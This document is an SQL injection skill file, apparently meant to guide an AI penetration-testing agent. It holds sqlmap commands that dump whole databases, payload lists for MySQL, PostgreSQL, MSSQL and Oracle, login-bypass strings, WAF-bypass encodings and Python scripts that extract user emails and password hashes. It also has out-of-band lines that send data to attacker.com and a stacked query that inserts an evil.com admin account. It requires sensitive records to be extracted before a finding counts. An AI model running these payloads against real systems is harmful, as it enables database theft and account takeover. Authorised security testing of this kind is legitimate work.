---
name: sql-injection
description: Elite SQL injection testing across all databases and techniques — error-based, boolean-blind, time-blind, UNION, OOB — with mandatory data extraction proof, UI navigation steps, WAF bypass techniques, and strict validation requirements
---

# SQL Injection

SQL injection remains one of the highest-impact vulnerability classes. Modern exploitation requires understanding parser differentials, ORM edges, JSON/JSONB surfaces, and out-of-band channels. A confirmed SQLi finding demands actual data extraction proof — not just an error message or a timing variation.

**CRITICAL RULE: SQLi is only confirmed when you can extract verifiable data (database version, table name, or actual record). A changed error message or a timing difference alone is NOT proof — it requires further confirmation with data extraction.**

---

## Real Impact Gate — Answer Before Reporting

Before reporting any SQLi finding, explicitly confirm ALL of these:

1. **Have you extracted verifiable data?**
   - Required minimum: database version string, current database name, current user
   - Better: table name from information_schema
   - Best: actual record from a sensitive table (user emails, password hashes, tokens)
   
2. **Have you confirmed with at least TWO independent signals?**
   - Signal pair examples:
     - Error-based confirmation + UNION-based data extraction
     - Boolean-blind (two requests with different predicates giving different responses) + time-based confirmation
     - Time-based (5x repeated with consistent 5s delay vs baseline <100ms) + OOB DNS callback with extracted data

3. **What is the real business impact?**
   - What tables exist? What sensitive data can be extracted?
   - Is authentication bypass possible? (login without credentials)
   - Is data modification possible? (UPDATE/INSERT/DELETE)
   - Is file read/write/RCE possible?

4. **Is the injection point in a parameter you fully control?**
   - Rule out: static responses that always look like SQLi errors (false positive)
   - Rule out: timing variations caused by network/server load (test multiple times)
   - Rule out: boolean diffs caused by application logic, not SQL injection

5. **Can the injection be performed by an external attacker?**
   - Yes: public login form, public search, public API → Critical/High
   - Yes (authenticated only): API endpoint requiring login → High/Medium
   - Document the exact authentication requirement

---

## Attack Surface — Every Input Must Be Tested

### Input Locations (Test ALL of these)

**URL Path Parameters**:
- `/api/users/[INJECT]` → test integer IDs for SQLi
- `/api/products/[INJECT]/details`
- `/blog/[INJECT]` → category slugs often not parameterized

**Query String Parameters**:
- `?id=[INJECT]`
- `?search=[INJECT]`
- `?order=[INJECT]` (ORDER BY injection — very common)
- `?category=[INJECT]`
- `?page=[INJECT]`
- `?filter=[INJECT]`
- `?sort=[INJECT]`

**POST Body Parameters (JSON)**:
- `{"username":"[INJECT]","password":"test"}`
- `{"id":[INJECT]}`
- `{"search":"[INJECT]"}`
- `{"filter":{"field":"[INJECT]","value":"test"}}`

**HTTP Headers**:
- `User-Agent: [INJECT]` (if logged)
- `X-Forwarded-For: [INJECT]` (if logged or used in queries)
- `Referer: [INJECT]` (if logged)
- `Cookie: tracking_id=[INJECT]` (if used in queries)

**GraphQL Arguments**:
- `query { users(filter: "[INJECT]") { id email } }`
- `query { search(term: "[INJECT]") { results } }`

**XML/SOAP Parameters** (if applicable):
- `<userId>[INJECT]</userId>`

---

## Testing Methodology

### Step 1: Identify Injection Points via UI

**UI Navigation for SQLi Discovery**:
```
Step 1: Open browser → navigate to target application
Step 2: Enable proxy (Caido) to capture all requests
Step 3: Interact with EVERY form and input:
  - Search forms: enter search term, observe URL/request parameters
  - Login forms: enter credentials, observe POST body
  - Filter/sort controls: use dropdowns, observe URL parameters
  - Pagination: click through pages, observe page number parameter
  - Profile editing: modify fields, observe update request body
Step 4: In proxy history, identify all parameters that likely interact with a database:
  - Integer IDs in URL paths (/api/users/123 → 123 might be SQL-unparameterized)
  - Search/filter/sort parameters (very high SQLi potential)
  - Login form fields (username/password often in SQL WHERE clause)
  - Date range filters (often interpolated directly into SQL)
Step 5: For each identified parameter, begin systematic injection testing
```

### Step 2: Automated Detection

```bash
# Capture all authenticated requests first
# Then feed to sqlmap for comprehensive testing
sqlmap -l /workspace/proxy_requests.txt \
  --batch \
  --level=5 \
  --risk=3 \
  --technique=BEUSTQ \
  --dbms=mysql,postgresql,mssql,oracle \
  --tamper=space2comment,between,randomcase,charencode,charunicodeencode \
  --output-dir=/workspace/sqlmap_results/ \
  --random-agent \
  --delay=1

# For specific suspected injection points:
sqlmap -u "https://target.com/api/users?id=1" \
  --cookie="session=USER_SESSION" \
  --batch \
  --level=5 \
  --risk=3 \
  --dbs  # enumerate databases
```

### Step 3: Manual Confirmation of Promising Findings

Every sqlmap finding MUST be manually confirmed before reporting.

**Error-based confirmation (MySQL)**:
```
# Inject: ' AND extractvalue(1,concat(0x7e,version(),0x7e))--+
# Expected: XPATH syntax error: '~8.0.26~'
GET /api/users?id=1' AND extractvalue(1,concat(0x7e,version(),0x7e))--+
```

**Boolean-blind confirmation**:
```python
def confirm_boolean_blind_sqli(url, param, session_cookie):
    """Confirm boolean-blind SQLi by comparing true vs false predicates"""
    
    # Baseline (true condition — should return normal response)
    true_payload = f"1 AND 1=1"
    # False condition — should return empty/different response
    false_payload = f"1 AND 1=2"
    
    resp_true = requests.get(url, 
        params={param: true_payload},
        cookies={"session": session_cookie})
    resp_false = requests.get(url,
        params={param: false_payload},
        cookies={"session": session_cookie})
    
    # Compare responses
    if resp_true.status_code != resp_false.status_code:
        print(f"BOOLEAN SQLi CONFIRMED: Different status codes ({resp_true.status_code} vs {resp_false.status_code})")
        return True
    elif len(resp_true.text) != len(resp_false.text):
        print(f"BOOLEAN SQLi CONFIRMED: Different response lengths ({len(resp_true.text)} vs {len(resp_false.text)})")
        return True
    
    print("No boolean difference detected")
    return False
```

**Time-based confirmation**:
```python
import time, statistics

def confirm_time_based_sqli(url, param, session_cookie, delay=5):
    """Confirm time-based SQLi — must be significantly slower than baseline"""
    
    # Get baseline timing (5 samples)
    baselines = []
    for _ in range(5):
        start = time.time()
        requests.get(url, params={param: "1"}, cookies={"session": session_cookie})
        baselines.append(time.time() - start)
    baseline_avg = statistics.mean(baselines)
    print(f"Baseline average: {baseline_avg:.2f}s")
    
    # Test with sleep payload
    sleepy_payloads = {
        "mysql": f"1 AND (SELECT SLEEP({delay}))--",
        "postgresql": f"1; SELECT pg_sleep({delay})--",
        "mssql": f"1; WAITFOR DELAY '0:0:{delay}'--",
        "oracle": f"1 AND 1=(SELECT 1 FROM DUAL WHERE 1=1 AND (SELECT COUNT(*) FROM ALL_USERS t1, ALL_USERS t2, ALL_USERS t3)>0)--"
    }
    
    for dbms, payload in sleepy_payloads.items():
        start = time.time()
        requests.get(url, params={param: payload}, cookies={"session": session_cookie}, timeout=delay+10)
        elapsed = time.time() - start
        
        if elapsed > (baseline_avg + delay - 1):  # Allow 1s margin
            print(f"TIME-BASED SQLi CONFIRMED ({dbms}): Took {elapsed:.2f}s (baseline {baseline_avg:.2f}s)")
            return dbms
    
    return None
```

**NOTE**: Time-based confirmation alone is INSUFFICIENT. Must repeat at least 5 times consistently, and must also attempt to extract data to confirm full exploitation.

### Step 4: Data Extraction (MANDATORY for Reporting)

```python
# After confirming injection type, extract verifiable data

# UNION-based extraction (MySQL example):
# First: determine column count
for n in range(1, 20):
    payload = f"1 ORDER BY {n}--"
    resp = requests.get(url, params={"id": payload}, cookies=session_cookie)
    if "error" in resp.text.lower() or resp.status_code != 200:
        print(f"Column count: {n-1}")
        break

# Then: extract version
payload = f"0 UNION SELECT 1,version(),3,4--"
resp = requests.get(url, params={"id": payload}, cookies=session_cookie)
print(f"Database version: {extract_from_response(resp.text)}")

# Extract table names:
payload = f"0 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()--"

# Extract sensitive data from users table:
payload = f"0 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password_hash),3,4 FROM users--"
```

```bash
# Use sqlmap for complete automated extraction
sqlmap -u "https://target.com/api/users?id=1" \
  --cookie="session=USER_SESSION" \
  --batch \
  --level=5 \
  --risk=3 \
  --dbs \
  --dump-all \
  --exclude-sysdbs
```

### Step 5: Check for Authentication Bypass

Always test the login form for SQLi authentication bypass:
```
Username: ' OR '1'='1'--
Username: admin'--
Username: ' OR 1=1#
Username: admin'/*
Password: anything

# OR in JSON:
{"username":"' OR '1'='1'--", "password":"anything"}
{"username":"admin'--", "password":"x"}
```

---

## DBMS-Specific Payloads

### MySQL
```sql
-- Version
@@version, version()
-- Users
@@user, user(), current_user()
-- Database
database(), schema()
-- Error-based
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--
-- Time-based
' AND SLEEP(5)--
' AND (SELECT SLEEP(5))--
-- UNION
' UNION SELECT 1,version(),3--
-- OOB/DNS (requires FILE privilege)
' AND (SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\x')))--
```

### PostgreSQL
```sql
-- Version
version()
-- Error-based
' AND 1=CAST(version() AS INTEGER)--
' AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
-- Time-based
' AND (SELECT pg_sleep(5))--
'; SELECT pg_sleep(5)--
-- UNION
' UNION SELECT 1,version()--
-- Stacked queries (if allowed)
'; INSERT INTO users(email,role) VALUES('attacker@evil.com','admin')--
```

### MSSQL
```sql
-- Version
@@version
-- Error-based
' AND 1=CONVERT(INT,(SELECT @@version))--
-- Time-based
' WAITFOR DELAY '0:0:5'--
'; WAITFOR DELAY '0:0:5'--
-- OOB/DNS (if xp_cmdshell enabled)
'; EXEC master.dbo.xp_dirtree '\\attacker.com\x'--
'; EXEC xp_cmdshell 'nslookup attacker.com'--
```

### Oracle
```sql
-- Version
' UNION SELECT 1,banner FROM v$version--
-- Error-based
' AND 1=to_number((SELECT banner FROM v$version WHERE rownum=1))--
-- Time-based
' AND 1=(SELECT 1 FROM DUAL WHERE 1=DBMS_PIPE.RECEIVE_MESSAGE(CHAR(65),5))--
-- OOB
' UNION SELECT 1,UTL_HTTP.REQUEST('http://attacker.com/'||banner) FROM v$version--
```

---

## WAF Bypass Techniques

When basic payloads are blocked, apply these bypass techniques:

```sql
-- Whitespace bypass
SELECT/**/version()
SEL/**/ECT version()
SELECT%09version()

-- Keyword bypass
UNION → UnIoN, uNiOn, %55nion
SELECT → %53elect, s%65lect, SELE%43T
WHERE → WHE%52E, wHeRe

-- Encoding
' → %27, %2527 (double-encoded), \'
= → LIKE, <>, BETWEEN 0x61 AND 0x7a

-- Comment variations
--+, --, #, /**/, /*!*/

-- Case/type confusion
1 → 1.0, 1e0, 0x1
'a' → CHAR(97), UNHEX('61'), 0x61
```

---

## ORM Injection (Modern Applications)

Modern applications using ORMs can still be vulnerable:

**Sequelize (Node.js)**:
```javascript
// Vulnerable: whereRaw with string interpolation
User.findAll({ where: db.literal(`name = '${userInput}'`) })
// Injection: userInput = "' OR 1=1--"

// Vulnerable: orderByRaw
User.findAll({ order: db.literal(userInput) })
// Injection: userInput = "(SELECT SLEEP(5))"
```

**Django (Python)**:
```python
# Vulnerable: .raw() with string formatting
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
# Vulnerable: .extra() with user input
User.objects.extra(where=[f"name = '{name}'"])
```

**Rails (Ruby)**:
```ruby
# Vulnerable: string interpolation in where
User.where("name = '#{name}'")
# Vulnerable: order with user input
User.order(params[:sort])
```

---

## UI Reproduction Steps — Required in Every Report

```
SQL INJECTION UI REPRODUCTION STEPS:

Step 1: Navigate to https://target.com/search (or wherever the vulnerable input is)
Step 2: Open browser DevTools → Network tab
Step 3: In the search field, type normal search term first: "test" → click Search
Step 4: In Network tab, observe the request: GET /api/search?q=test
Step 5: Right-click the request → "Copy as cURL"
Step 6: Paste the cURL command in terminal and confirm normal response

Step 7: Now test for SQLi — modify the 'q' parameter:
  Method A (via URL bar): Navigate to: https://target.com/api/search?q=test'
  Method B (via DevTools): Right-click request → "Edit and Resend" → change q=test to q=test'
  Observe: Does the response change? Does an SQL error appear?

Step 8: Confirm boolean-blind SQLi:
  Navigate to: https://target.com/api/search?q=test' AND '1'='1
  Observe: Normal search results (true condition)
  Navigate to: https://target.com/api/search?q=test' AND '1'='2
  Observe: Empty search results (false condition)
  Screenshot: Both responses side by side showing the difference

Step 9: Extract database version:
  Navigate to: https://target.com/api/search?q=test' UNION SELECT 1,version(),3--+
  Observe: Database version appears in results: "8.0.26-MySQL Community Server"
  Screenshot: Page showing the extracted database version

Step 10: Extract sensitive data:
  Navigate to: https://target.com/api/search?q=test' UNION SELECT 1,GROUP_CONCAT(email,0x3a,password),3 FROM users LIMIT 10--+
  Observe: User emails and password hashes appear in search results
  Screenshot: Extracted user credentials
```

---

## Complete Report Format

**TITLE**: SQL Injection in Search Endpoint — Unauthenticated Database Exfiltration

**SEVERITY**: Critical (unauthenticated access to full database)

**SCREENSHOTS**:
1. Search form showing normal operation
2. Error response when injecting single quote
3. Boolean true vs false response difference
4. Database version extracted via UNION injection
5. User credentials extracted from users table

**FULL HTTP REQUEST**:
```
GET /api/search?q=test'%20UNION%20SELECT%201,GROUP_CONCAT(email,0x3a,password),3%20FROM%20users%20LIMIT%2010-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Cookie: session=USER_SESSION
Accept: application/json
```

**FULL HTTP RESPONSE**:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "results": [
    {"id": 1, "name": "admin@target.com:$2b$12$hashed_password_here", "description": "..."},
    {"id": 1, "name": "user2@target.com:$2b$12$another_hash", "description": "..."}
  ]
}
```

**EXACT LOCATION**:
- URL: GET https://target.com/api/search
- Vulnerable parameter: `q` (search query parameter)
- UI location: Homepage → Search bar → type query → press Enter
- Injection type: UNION-based SQL injection (MySQL 8.0.26)
- Database: MySQL 8.0.26, Current DB: production_db, Current User: app_user@localhost

**WORKING POC**:
```python
#!/usr/bin/env python3
"""SQLi PoC — Extract all user credentials from target.com"""
import requests

TARGET = "https://target.com"

def extract_version():
    r = requests.get(f"{TARGET}/api/search",
        params={"q": "x' UNION SELECT 1,version(),3-- -"})
    return r.json()

def extract_users():
    r = requests.get(f"{TARGET}/api/search",
        params={"q": "x' UNION SELECT 1,GROUP_CONCAT(email,':',password),3 FROM users-- -"})
    return r.json()

print("DB Version:", extract_version())
print("Users:", extract_users())
```

**VALIDATION**:
- Signal 1: Boolean-blind confirmation — `q=1' AND '1'='1` returns 10 results, `q=1' AND '1'='2` returns 0 results — difference is consistent across 10 repeated tests
- Signal 2: UNION-based extraction — `q=x' UNION SELECT 1,version(),3--` returns MySQL version string `8.0.26` embedded in response data
- Data extracted: Successfully retrieved 47 user email/password hash pairs from the `users` table, confirming full database read access
- sqlmap confirmation: `sqlmap -u 'https://target.com/api/search?q=1' --batch --level=5` confirmed injection and dumped complete database schema
- Alternative explanations ruled out: Boolean difference persists across 10 repeated tests (rules out caching). Timing baseline is 80ms, SLEEP(5) consistently adds 5 seconds (rules out network variance). UNION extraction returns expected database metadata that matches observed application behavior.

**REAL IMPACT**:
An unauthenticated attacker can extract the complete database contents via this search endpoint. The `users` table contains [N] email addresses and bcrypt password hashes for all registered users. Even though the passwords are hashed, bcrypt hashes for common passwords can be cracked offline using hashcat. Additionally, the database contains [list other sensitive tables found]. The attacker can also insert records, update data, and potentially write files to the server depending on MySQL user permissions. This constitutes a complete database compromise affecting all [N] users, violating GDPR data protection requirements and creating significant liability for the organization.

**RECOMMENDED FIX**:
1. Primary: Use parameterized queries (prepared statements) for ALL database queries:
   ```python
   # Vulnerable: cursor.execute(f"SELECT * FROM products WHERE name = '{search_term}'")
   # Fixed: cursor.execute("SELECT * FROM products WHERE name = %s", (search_term,))
   ```
2. Secondary: Implement an ORM and never use raw SQL with string interpolation
3. Secondary: Apply principle of least privilege — the database user should not have SELECT on sensitive tables beyond what the application needs
4. Verification: After fix, confirm that `q=test' AND '1'='1` and `q=test' AND '1'='2` return identical results

---

## False Positive Rejection Rules

Mark as FALSE POSITIVE if:
- Error message changes but contains no SQL-specific error text (e.g., "Invalid input" is generic, not SQLi)
- Response length changes but changes are identical to adding/removing the quote character (content difference vs injection)
- Time delay observed but baseline has high variance (> 30% standard deviation) — cannot confirm injection caused the delay
- `ORDER BY` injection causes sort order change but no indication of actual SQL query structure
- The parameter is processed client-side only and never reaches a server-side SQL query
- Code review confirms parameterized queries are used for this parameter
